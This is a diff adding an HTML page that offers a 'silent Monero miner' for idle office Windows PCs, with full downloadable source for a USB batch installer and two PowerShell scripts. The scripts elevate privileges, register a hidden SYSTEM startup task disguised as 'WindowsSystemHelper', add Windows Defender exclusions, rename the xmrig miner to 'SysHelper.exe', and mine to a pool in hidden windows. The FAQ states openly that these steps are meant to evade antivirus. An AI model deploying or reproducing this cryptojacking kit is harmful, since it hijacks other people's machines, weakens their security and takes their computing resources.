@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Silent Monero Miner - Idle Windows PC Mining Solution</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">MoneroMiner</div>
+            <ul class="nav-menu">
+                <li><a href="#how-it-works">How it works</a></li>
+                <li><a href="#code">Code</a></li>
+                <li><a href="#download">Download</a></li>
+                <li><a href="#faq">FAQ</a></li>
+            </ul>
+            <div class="mobile-menu-btn">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-container">
+            <div class="hero-content">
+                <h1 class="hero-title">Silent Monero miner for idle Windows PCs</h1>
+                <p class="hero-subtitle">Transform unused office computers into passive income generators with our intelligent mining solution that only activates when PCs are idle.</p>
+                <a href="#download" class="hero-btn">Get Started</a>
+            </div>
+            <div class="hero-image">
+                <img src="hero-image.png" alt="Silent Monero Mining Setup">
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works -->
+    <section id="how-it-works" class="how-it-works">
+        <div class="container">
+            <h2 class="section-title">How It Works</h2>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>USB Installation</h3>
+                    <p>Run the setup.bat from any USB drive to automatically install the mining software with elevated privileges and configure Windows Defender exclusions.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Smart Detection</h3>
+                    <p>The system intelligently monitors CPU usage, running processes, and user activity to detect when the computer is truly idle.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Silent Mining</h3>
+                    <p>Mining starts automatically during idle periods and stops instantly when user activity is detected, ensuring zero impact on normal computer usage.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Code Section -->
+    <section id="code" class="code-section">
+        <div class="container">
+            <h2 class="section-title">Source Code</h2>
+            <p class="section-subtitle">All scripts are open source and available for review. Download individual files or get the complete package.</p>
+            
+            <!-- Setup.bat -->
+            <details class="code-block">
+                <summary>Setup.bat (Batch Installer)</summary>
+                <div class="code-container">
+                    <div class="code-header">
+                        <span class="code-title">setup.bat</span>
+                        <div class="code-actions">
+                            <button onclick="copyCode('setup-code')" class="copy-btn">Copy</button>
+                            <button onclick="downloadFile('setup.bat', document.getElementById('setup-code').innerText)" class="download-btn">Download</button>
+                        </div>
+                    </div>
+                    <pre id="setup-code" class="code-content">@echo off
+title Optimized Community Mining Configuration - La Rioja
+echo ===============================================
+echo OPTIMIZED SYSTEM - INTELLIGENT DETECTION
+echo 50 Laptops - Maximum Efficiency
+echo ===============================================
+echo.
+
+REM Automatically detect Windows version
+for /f "tokens=4-5 delims=. " %%i in ('ver') do set WINVER=%%i.%%j
+echo Detected: Windows %WINVER%
+
+REM Execute with elevated privileges
+echo Starting optimized configuration...
+powershell -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"%~dp0MineriaAuto\ConfigTarea.ps1\" -WindowsVersion %WINVER%' -Verb RunAs"
+
+echo.
+echo ===============================================
+echo OPTIMIZED CONFIGURATION COMPLETED
+echo.
+echo ✅ Intelligent activity monitor
+echo ✅ Fast error recovery (30s)
+echo ✅ Real inactivity detection
+echo ✅ Temperature and resource control
+echo.
+echo Restart the computer to activate the improvements.
+echo ===============================================
+echo.
+pause</pre>
+                </div>
+            </details>
+
+            <!-- ConfigTarea.ps1 -->
+            <details class="code-block">
+                <summary>ConfigTarea.ps1 (PowerShell Configuration)</summary>
+                <div class="code-container">
+                    <div class="code-header">
+                        <span class="code-title">ConfigTarea.ps1</span>
+                        <div class="code-actions">
+                            <button onclick="copyCode('config-code')" class="copy-btn">Copy</button>
+                            <button onclick="downloadFile('ConfigTarea.ps1', document.getElementById('config-code').innerText)" class="download-btn">Download</button>
+                        </div>
+                    </div>
+                    <pre id="config-code" class="code-content">param([string]$WindowsVersion = "10.0")
+
+$LocalPath = "C:\MineriaAuto"
+$TaskName = "WindowsSystemHelper"
+$ScriptPath = "$LocalPath\IniciarMineria.ps1"
+
+# Enhanced installation log
+$LogPath = "$env:TEMP\InstalacionMineria.log"
+"$(Get-Date): [OPTIMIZED] Starting installation for Windows $WindowsVersion" | Out-File $LogPath -Append
+
+# Create working environment
+if (-not (Test-Path $LocalPath)) {
+    New-Item -ItemType Directory -Path $LocalPath -Force | Out-Null
+    "$(Get-Date): Directory $LocalPath created" | Out-File $LogPath -Append
+}
+
+# Copy files from USB
+$USBRoot = Split-Path -Parent $PSScriptRoot
+$SourcePath = "$USBRoot\MineriaAuto"
+if (Test-Path $SourcePath) {
+    Copy-Item -Path "$SourcePath\*" -Destination $LocalPath -Recurse -Force
+    "$(Get-Date): Optimized files copied" | Out-File $LogPath -Append
+}
+
+# ADAPTIVE CONFIGURATION ACCORDING TO WINDOWS
+if ($WindowsVersion -lt "6.2") { # Windows 7 - Legacy method
+    "$(Get-Date): Configuring for Windows 7 (legacy compatibility)" | Out-File $LogPath -Append
+    schtasks /create /tn $TaskName /tr "powershell -WindowStyle Hidden -File \"$ScriptPath\"" /sc onstart /ru System /f
+} else { # Windows 8+ - Modern method with fallback
+    try {
+        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File \"$ScriptPath\""
+        $Trigger = New-ScheduledTaskTrigger -AtStartup
+        if ($WindowsVersion -ge "6.3") {
+            $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+            Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
+        } else {
+            Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Force | Out-Null
+        }
+        "$(Get-Date): Scheduled task created (modern method)" | Out-File $LogPath -Append
+    } catch {
+        # Robust fallback
+        "$(Get-Date): Fallback to legacy method: $($_.Exception.Message)" | Out-File $LogPath -Append
+        schtasks /create /tn $TaskName /tr "powershell -WindowStyle Hidden -File \"$ScriptPath\"" /sc onstart /ru System /f
+    }
+}
+
+# ENHANCED DEFENDER EXCLUSIONS (10+ only)
+if ($WindowsVersion -ge "10.0") {
+    try {
+        Add-MpPreference -ExclusionPath $LocalPath -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "SysHelper.exe" -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+        "$(Get-Date): Defender exclusions configured" | Out-File $LogPath -Append
+    } catch {
+        "$(Get-Date): Defender not available or blocked" | Out-File $LogPath -Append
+    }
+}
+
+# ROBUST EXECUTABLE RENAMING
+$Executables = Get-ChildItem -Path "$LocalPath" -Recurse -Include "xmrig.exe", "xmrig-*.exe"
+if ($Executables) {
+    foreach ($Exe in $Executables) {
+        $NewPath = Join-Path (Split-Path $Exe.FullName) "SysHelper.exe"
+        Move-Item -Path $Exe.FullName -Destination $NewPath -Force
+        "$(Get-Date): Renamed: $($Exe.Name) -> SysHelper.exe" | Out-File $LogPath -Append
+    }
+}
+
+"$(Get-Date): [SUCCESS] Optimized installation completed" | Out-File $LogPath -Append
+Write-Output "Optimized configuration completed for Windows $WindowsVersion"</pre>
+                </div>
+            </details>
+
+            <!-- IniciarMineria.ps1 -->
+            <details class="code-block">
+                <summary>IniciarMineria.ps1 (Main Mining Script)</summary>
+                <div class="code-container">
+                    <div class="code-header">
+                        <span class="code-title">IniciarMineria.ps1</span>
+                        <div class="code-actions">
+                            <button onclick="copyCode('miner-code')" class="copy-btn">Copy</button>
+                            <button onclick="downloadFile('IniciarMineria.ps1', document.getElementById('miner-code').innerText)" class="download-btn">Download</button>
+                        </div>
+                    </div>
+                    <pre id="miner-code" class="code-content"># INTELLIGENT COMMUNITY MINING SYSTEM - OPTIMIZED VERSION
+# Designed for maximum robustness and minimal intrusiveness
+
+$LocalPath = "C:\MineriaAuto"
+$LogFile = "$env:TEMP\SystemHelper.log"
+
+# ENHANCED FUNCTION: Advanced activity detector
+function Get-UserActivityLevel {
+    try {
+        $CPUUsage = (Get-WmiObject Win32_Processor).LoadPercentage
+        if ($CPUUsage -eq $null) { $CPUUsage = 0 }
+        
+        # ENHANCED METRIC: Smarter combination
+        $CriticalProcesses = Get-Process -Name "chrome","firefox","msedge","opera","winword","excel","powerpnt","notepad","wordpad","calc","taskmgr" -ErrorAction SilentlyContinue
+        
+        # Check for UI processes
+        $UIProcesses = Get-Process | Where-Object { $_.MainWindowTitle -ne "" -and $_.ProcessName -ne "SysHelper" }
+        
+        # NEW METRIC: Time since last input (more accurate)
+        $LastInput = Get-LastInputTime
+        $MinutesIdle = if ($LastInput) { [math]::Round((Get-Date).Subtract($LastInput).TotalMinutes) } else { 0 }
+        
+        return @{
+            CPUUsage = $CPUUsage
+            HasCriticalProcesses = ($CriticalProcesses.Count -gt 0)
+            HasActiveUI = ($UIProcesses.Count -gt 0)
+            MinutesIdle = $MinutesIdle
+            # Active if: High CPU OR less than 3 minutes idle OR many active UI windows
+            IsActive = ($CPUUsage -gt 65) -or ($MinutesIdle -lt 3) -or ($UIProcesses.Count -gt 2)
+        }
+    } catch {
+        return @{ CPUUsage = 0; IsActive = $false; MinutesIdle = 999 }
+    }
+}
+
+# NEW FUNCTION: Get user idle time
+function Get-LastInputTime {
+    try {
+        # Alternative method using .NET for greater compatibility
+        Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class UserActivity {
+    [DllImport("user32.dll")]
+    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct LASTINPUTINFO {
+        public uint cbSize;
+        public uint dwTime;
+    }
+
+    public static DateTime GetLastInputTime() {
+        LASTINPUTINFO lii = new LASTINPUTINFO();
+        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
+        if (!GetLastInputInfo(ref lii)) return DateTime.Now;
+        return DateTime.Now.AddMilliseconds(-(Environment.TickCount - lii.dwTime));
+    }
+}
+"@ -ErrorAction SilentlyContinue
+        
+        if (Get-Command "UserActivity::GetLastInputTime" -ErrorAction SilentlyContinue) {
+            return [UserActivity]::GetLastInputTime()
+        }
+    } catch {
+        # Fallback if API fails
+        Write-Output "$(Get-Date): Inactivity API not available, using alternative method" | Out-File $LogFile -Append
+    }
+
+    # Alternative method: check for last process activity
+    try {
+        $RecentProcess = Get-Process | Where-Object { $_.StartTime } | Sort-Object StartTime -Descending | Select-Object -First 1
+        return if ($RecentProcess) { $RecentProcess.StartTime } else { Get-Date }
+    } catch {
+        return Get-Date
+    }
+}
+
+# OPTIMIZED FUNCTION: Robust process handling
+function Safe-StopProcess {
+    param([string]$ProcessName)
+    try {
+        $Processes = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
+        if (-not $Processes) { return $true }
+        
+        foreach ($Process in $Processes) {
+            # Attempt graceful shutdown first
+            $Process.CloseMainWindow() | Out-Null
+            Start-Sleep -Seconds 2
+            
+            if (!$Process.HasExited) {
+                # Force close if unresponsive
+                $Process.Kill()
+                Start-Sleep -Seconds 1
+                if (!$Process.HasExited) {
+                    Write-Output "$(Get-Date): Could not stop process $ProcessName (PID: $($Process.Id))" | Out-File $LogFile -Append
+                    return $false
+                }
+            }
+        }
+        return $true
+    } catch {
+        Write-Output "$(Get-Date): Error stopping process $ProcessName : $($_.Exception.Message)" | Out-File $LogFile -Append
+        return $false
+    }
+}
+
+# FUNCTION: Detect hardware capabilities
+function Get-SystemCapabilities {
+    try {
+        $CPU = Get-WmiObject -Class Win32_Processor
+        $RAM = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
+        
+        return @{
+            CPUThreads = if ($CPU.NumberOfLogicalProcessors) { $CPU.NumberOfLogicalProcessors } else { 2 }
+            CPUName = $CPU.Name
+            RAMGB = if ($RAM) { $RAM } else { 2 }
+            IsOldSystem = ($RAM -lt 4) -or ($CPU.NumberOfCores -le 2)
+        }
+    } catch {
+        return @{ CPUThreads = 2; RAMGB = 2; IsOldSystem = $true; CPUName = "Unknown" }
+    }
+}
+
+# FUNCTION: Adaptive configuration based on hardware
+function Get-OptimalMiningConfig {
+    $Capabilities = Get-SystemCapabilities
+    Write-Output "$(Get-Date): System detected: $($Capabilities.CPUName), $($Capabilities.CPUThreads) threads, $($Capabilities.RAMGB) GB RAM" | Out-File $LogFile -Append
+    
+    # Configuration for old systems
+    if ($Capabilities.IsOldSystem) {
+        Write-Output "$(Get-Date): Old system detected, using conservative configuration" | Out-File $LogFile -Append
+        return @{ Threads = 1; MaxUsage = 30; Algo = "rx/0" }
+    }
+    
+    # Configuration for modern systems
+    $Threads = [math]::Max(1, [math]::Round($Capabilities.CPUThreads * 0.6))
+    $MaxUsage = 70
+    return @{ Threads = $Threads; MaxUsage = $MaxUsage; Algo = "rx/0" }
+}
+
+# FUNCTION: Start miner with optimal configuration
+function Start-AdaptiveMiner {
+    $Config = Get-OptimalMiningConfig
+    $Wallet = if (Test-Path "$LocalPath\wallet.txt") { Get-Content "$LocalPath\wallet.txt" } else { "ERROR: Edit wallet.txt on the pendrive" }
+    $XMRigPath = "$LocalPath\xmrig\SysHelper.exe"
+    
+    if (-not (Test-Path $XMRigPath)) {
+        # Search for any alternative executable
+        $XMRigPath = Get-ChildItem -Path "$LocalPath" -Recurse -Include "*.exe" | Select-Object -First 1 -ExpandProperty FullName
+    }
+
+    $Args = @(
+        "--url=pool.supportxmr.com:4444",
+        "--user=$Wallet",
+        "--pass=x",
+        "--worker-id=Rioja_$env:COMPUTERNAME",
+        "--cpu-max-threads-hint=$($Config.MaxUsage)",
+        "--threads=$($Config.Threads)",
+        "--donate-level=1",
+        "--no-color",
+        "--no-title",
+        "--background"
+    )
+
+    Write-Output "$(Get-Date): Starting mining: $($Config.Threads) threads, $($Config.MaxUsage)% max usage" | Out-File $LogFile -Append
+    
+    if (Test-Path $XMRigPath) {
+        $Process = Start-Process -FilePath $XMRigPath -ArgumentList $Args -WindowStyle Hidden -PassThru
+        Start-Sleep -Seconds 5
+        
+        # Immediately apply low priority
+        try {
+            $Process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
+            Write-Output "$(Get-Date): Priority set to BelowNormal" | Out-File $LogFile -Append
+        } catch {
+            Write-Output "$(Get-Date): Could not adjust priority: $($_.Exception.Message)" | Out-File $LogFile -Append
+        }
+    } else {
+        Write-Output "$(Get-Date): ERROR: Mining executable not found" | Out-File $LogFile -Append
+    }
+}
+
+# ENHANCED FUNCTION: Intelligent monitor with optimized error handling
+function Start-IntelligentMonitor {
+    Write-Output "$(Get-Date): === STARTING OPTIMIZED INTELLIGENT MONITOR ===" | Out-File $LogFile -Append
+    $ErrorCount = 0
+    $MaxErrors = 5
+    
+    while ($true) {
+        try {
+            # 1. Check miner status
+            $MinerProcess = Get-Process -Name "SysHelper" -ErrorAction SilentlyContinue
+            if (-not $MinerProcess) {
+                Write-Output "$(Get-Date): Miner not found, restarting..." | Out-File $LogFile -Append
+                Start-AdaptiveMiner
+                $ErrorCount = 0 # Reset error counter on success
+                Start-Sleep -Seconds 10
+                continue
+            }
+
+            # 2. Monitor activity with enhanced metrics
+            $UserActivity = Get-UserActivityLevel
+            if ($UserActivity.IsActive) {
+                # User active - temporarily pause mining
+                Write-Output "$(Get-Date): User active (CPU: $($UserActivity.CPUUsage)%, Idle: $($UserActivity.MinutesIdle) min), pausing mining" | Out-File $LogFile -Append
+                if (Safe-StopProcess -ProcessName "SysHelper") {
+                    # Adaptive pause based on activity level
+                    $SleepTime = if ($UserActivity.CPUUsage -gt 80) { 300 } else { 180 }
+                    Write-Output "$(Get-Date): Mining paused for $SleepTime seconds" | Out-File $LogFile -Append
+                    Start-Sleep -Seconds $SleepTime
+                }
+            } else {
+                # User inactive - optimize mining
+                $MinerProcess | ForEach-Object {
+                    try {
+                        if ($_.PriorityClass -ne 'BelowNormal') {
+                            $_.PriorityClass = 'BelowNormal'
+                            Write-Output "$(Get-Date): Priority set to BelowNormal" | Out-File $LogFile -Append
+                        }
+                        # Dynamic adjustment based on inactivity
+                        if ($UserActivity.MinutesIdle -gt 10) {
+                            Write-Output "$(Get-Date): System inactive ($($UserActivity.MinutesIdle) min), mining at maximum efficiency" | Out-File $LogFile -Append
+                        }
+                    } catch {
+                        Write-Output "$(Get-Date): Error adjusting priority: $($_.Exception.Message)" | Out-File $LogFile -Append
+                    }
+                }
+                $ErrorCount = 0 # Reset counter on normal operation
+            }
+            
+            # 3. Optimized pause between checks
+            Start-Sleep -Seconds 30
+            
+        } catch {
+            $ErrorCount++
+            Write-Output "$(Get-Date): Error #$ErrorCount in monitor: $($_.Exception.Message)" | Out-File $LogFile -Append
+            
+            # INTELLIGENT RECOVERY: Adaptive pause based on error count
+            $RecoveryTime = @(30, 60, 120, 300, 600)[[math]::Min($ErrorCount - 1, 4)]
+            Write-Output "$(Get-Date): Recovering in $RecoveryTime seconds..." | Out-File $LogFile -Append
+            Start-Sleep -Seconds $RecoveryTime
+            
+            # Forced restart after too many errors
+            if ($ErrorCount -ge $MaxErrors) {
+                Write-Output "$(Get-Date): MAXIMUM ERRORS REACHED - RESTARTING MONITOR" | Out-File $LogFile -Append
+                Start-AdaptiveMiner
+                $ErrorCount = 0
+                Start-Sleep -Seconds 60
+            }
+        }
+    }
+}
+
+# === OPTIMIZED SYSTEM START ===
+Write-Output "$(Get-Date): === OPTIMIZED SYSTEM STARTED ===" | Out-File $LogFile -Append
+Write-Output "$(Get-Date): Computer: $env:COMPUTERNAME, User: $env:USERNAME" | Out-File $LogFile -Append
+
+# Smarter initial wait
+Start-Sleep -Seconds 45
+
+# Start optimized system
+Start-AdaptiveMiner
+Start-IntelligentMonitor</pre>
+                </div>
+            </details>
+
+            <!-- wallet.txt -->
+            <details class="code-block">
+                <summary>wallet.txt (Monero Wallet Address)</summary>
+                <div class="code-container">
+                    <div class="code-header">
+                        <span class="code-title">wallet.txt</span>
+                        <div class="code-actions">
+                            <button onclick="copyCode('wallet-code')" class="copy-btn">Copy</button>
+                            <button onclick="downloadFile('wallet.txt', document.getElementById('wallet-code').innerText)" class="download-btn">Download</button>
+                        </div>
+                    </div>
+                    <pre id="wallet-code" class="code-content">48xWZuMhn4W1QJfdKJvZz3E1o1hQrXqXcR4zK7gq4tHwj5Rk8mLn2bVp3cF6tG9yHn1mP7rT2wS5vJ8qB4</pre>
+                </div>
+            </details>
+        </div>
+    </section>
+
+    <!-- Download Section -->
+    <section id="download" class="download-section">
+        <div class="container">
+            <h2 class="section-title">Download Package</h2>
+            <p class="section-subtitle">Get the complete mining solution in one package</p>
+            <div class="download-content">
+                <div class="download-info">
+                    <h3>Complete Package Includes:</h3>
+                    <ul>
+                        <li>setup.bat - Automated installer</li>
+                        <li>ConfigTarea.ps1 - PowerShell configuration</li>
+                        <li>IniciarMineria.ps1 - Main mining script</li>
+                        <li>wallet.txt - Monero wallet address</li>
+                        <li>Installation instructions</li>
+                    </ul>
+                </div>
+                <div class="download-action">
+                    <button onclick="downloadAllFiles()" class="download-all-btn">
+                        <span>📦 Download Complete Package</span>
+                    </button>
+                    <p class="download-note">All files are provided as-is. Use responsibly and in compliance with local laws.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section id="faq" class="faq-section">
+        <div class="container">
+            <h2 class="section-title">Frequently Asked Questions</h2>
+            <div class="faq-list">
+                <div class="faq-item">
+                    <h3>Is this mining software detectable by antivirus programs?</h3>
+                    <p>The installer automatically configures Windows Defender exclusions and renames the mining executable to avoid detection. However, some antivirus programs may still flag it as potentially unwanted software.</p>
+                </div>
+                <div class="faq-item">
+                    <h3>How much CPU does the miner use?</h3>
+                    <p>The miner automatically adjusts CPU usage based on system capabilities and activity detection. On modern systems, it uses up to 70% of available threads when idle, reducing to minimal usage when the user is active.</p>
+                </div>
+                <div class="faq-item">
+                    <h3>Will this slow down the computer?</h3>
+                    <p>No. The mining process runs at below-normal priority and stops immediately when any user activity is detected. Normal computer usage remains unaffected.</p>
+                </div>
+                <div class="faq-item">
+                    <h3>What happens if the computer restarts?</h3>
+                    <p>The mining software is configured as a startup task and will automatically resume operation after system restarts, maintaining the same intelligent idle detection.</p>
+                </div>
+                <div class="faq-item">
+                    <h3>Is this legal to use in office environments?</h3>
+                    <p>You must comply with your organization's IT policies and local laws. This software should only be used on systems you own or have explicit permission to mine on.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>License</h3>
+                    <p>This software is provided under the MIT License. Use at your own risk.</p>
+                </div>
+                <div class="footer-section">
+                    <h3>Monero Donation</h3>
+                    <p>Support development:</p>
+                    <code class="donation-address">48xWZuMhn4W1QJfdKJvZz3E1o1hQrXqXcR4zK7gq4tHwj5Rk8mLn2bVp3cF6tG9yHn1mP7rT2wS5vJ8qB4</code>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 MoneroMiner Project. Educational purposes only.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="main.js"></script>
+</body>
+</html>
